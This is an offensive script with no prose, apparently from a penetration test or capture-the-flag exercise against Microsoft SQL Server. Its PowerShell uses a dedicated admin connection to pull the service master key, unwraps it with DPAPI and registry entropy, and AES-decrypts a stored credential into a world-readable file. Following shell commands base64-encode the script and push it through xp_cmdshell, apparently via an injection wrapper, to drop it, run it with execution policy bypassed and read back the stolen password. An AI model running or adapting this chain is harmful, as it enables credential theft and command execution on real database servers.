powershell
try{Add-Type -AssemblyName System.Security;Add-Type -AssemblyName System.Data;
$c=New-Object System.Data.SqlClient.SqlConnection "Data Source=ADMIN:localhost;Integrated Security=SSPI;Connect Timeout=3;Pooling=False";
$c.Open();$q=$c.CreateCommand();
$q.CommandText="SELECT crypt_property FROM sys.key_encryptions WHERE key_id=102 AND thumbprint=0x0300000001";
$r=$q.ExecuteReader();$null=$r.Read();$k=$r.GetSqlBytes(0).Value;$r.Close();
$k=$k[8..($k.Length-1)];
$e=(gp "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL17.MSSQLSERVER\Security").Entropy;
$s=[Security.Cryptography.ProtectedData]::Unprotect($k,$e,"LocalMachine");
$q.CommandText="SELECT imageval FROM sys.sysobjvalues WHERE objid=65549 AND valclass=28 AND valnum=2";
$r=$q.ExecuteReader();$null=$r.Read();$v=$r.GetSqlBytes(0).Value;$r.Close();
$a=[Security.Cryptography.Aes]::Create();$a.Mode="CBC";$a.Padding="None";$a.Key=$s;$a.IV=[byte[]]$v[4..19];
$n=$v.Length-20;$n-=$n%16;
$p=$a.CreateDecryptor().TransformFinalBlock($v,20,$n);
[Text.Encoding]::Unicode.GetString($p,8,$p.Length-8).Trim([char]0).Trim()|Set-Content C:\Users\Public\pw.txt
}catch{$_.Exception.Message|Set-Content C:\Users\Public\pw.txt}

printf '\xff\xfe' > u16.ps1; iconv -f UTF-8 -t UTF-16LE u.ps1 >> u16.ps1

B64=$(base64 -w0 u16.ps1)

xv "cambiar_por_codigo_override EXEC xp_cmdshell 'echo $B64 > C:\Users\Public\u.b64'"

xv "cambiar_por_codigo_override EXEC xp_cmdshell 'powershell -nop -c "[IO.File]::WriteAllBytes(''C:\Users\Public\u.ps1'',[Convert]::FromBase64String((Get-Content -Raw C:\Users\Public\u.b64)))"'"

xv "cambiar_por_codigo_override EXEC xp_cmdshell 'powershell -nop -ep bypass -File C:\Users\Public\u.ps1 > C:\Users\Public\o.txt 2>&1'"

xv "cambiar_por_codigo_override EXEC xp_cmdshell 'type C:\Users\Public\pw.txt'"
